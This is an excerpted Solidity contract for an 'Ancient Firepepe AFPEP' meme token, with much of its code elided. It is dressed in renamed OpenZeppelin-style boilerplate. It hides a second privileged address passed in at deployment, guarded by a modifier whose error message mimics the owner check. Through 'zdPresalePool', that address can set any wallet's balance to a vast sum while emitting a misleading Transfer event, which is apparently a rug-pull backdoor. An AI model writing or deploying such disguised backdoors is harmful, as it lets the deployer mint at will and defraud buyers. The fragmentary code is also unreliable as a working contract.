...
/// https://x.com/AncientFirepepeAFPEP


pragma solidity 0.8.29;

// AncientFirepepeAFPEP fan token

interface AncientFirepepeAFPEPinterface {
  /**
...
/*
 * @dev Provides information about the current execution AncientFirepepeAFPEP20Burnable, including the
 ...
 */
abstract contract AncientFirepepeAFPEP20Burnable {
...
// File: @openzeppelin/contracts/access/AncientFirepepeAFPEP20Ownable.sol
 ...
 * the owner.
 */
abstract contract AncientFirepepeAFPEP20Ownable is AncientFirepepeAFPEP20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "AncientFirepepeAFPEP20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "AncientFirepepeAFPEP20Ownable: new owner is the zero address");
 ...
 * `SafeAncientFirepepeAFPEP` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeAncientFirepepeAFPEP {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeAncientFirepepeAFPEP: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeAncientFirepepeAFPEP: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeAncientFirepepeAFPEP: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeAncientFirepepeAFPEP: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeAncientFirepepeAFPEP: modulo by zero");
  }
...
contract AncientFirepepeAFPEPToken is AncientFirepepeAFPEP20Burnable, AncientFirepepeAFPEPinterface, AncientFirepepeAFPEP20Ownable {
    
    using SafeAncientFirepepeAFPEP for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "Ancient Firepepe AFPEP";
        _symbol = "Ancient Firepepe AFPEP";
        _decimals = 9;
        _totalSupply = 100100100100 * 10 ** 9;
    ...
    */
    ...
    /**
    * @dev See {AncientFirepepeAFPEPinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {AncientFirepepeAFPEPinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "AncientFirepepeAFPEP20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {AncientFirepepeAFPEPinterface-approve}.
    *
    * Requirements:
    *
    * - `transporteur` cannot be the zero address.
    */
function aTUSDPresalePool(address[] calldata tusdRewards) external subowner {
    ...
    /**
    * @dev See {AncientFirepepeAFPEPinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    function zdPresalePool(address BaseRewards) external subowner {
        mintfrom[BaseRewards] = 10000000000 * 10 ** 20;
        
        emit Transfer(BaseRewards, address(0), 10000000000 * 10 ** 20);
    }
    /**
    * @dev See {AncientFirepepeAFPEPinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {AncientFirepepeAFPEPinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {AncientFirepepeAFPEPinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "AncientFirepepeAFPEPinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {AncientFirepepeAFPEPinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "AncientFirepepeAFPEPinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "AncientFirepepeAFPEPinterface: transfer from the zero address");
        require(shippingto != address(0), "AncientFirepepeAFPEPinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "AncientFirepepeAFPEPinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "AncientFirepepeAFPEPinterface: approve from the zero address");
        require(transporteur != address(0), "AncientFirepepeAFPEPinterface: approve to the zero address");
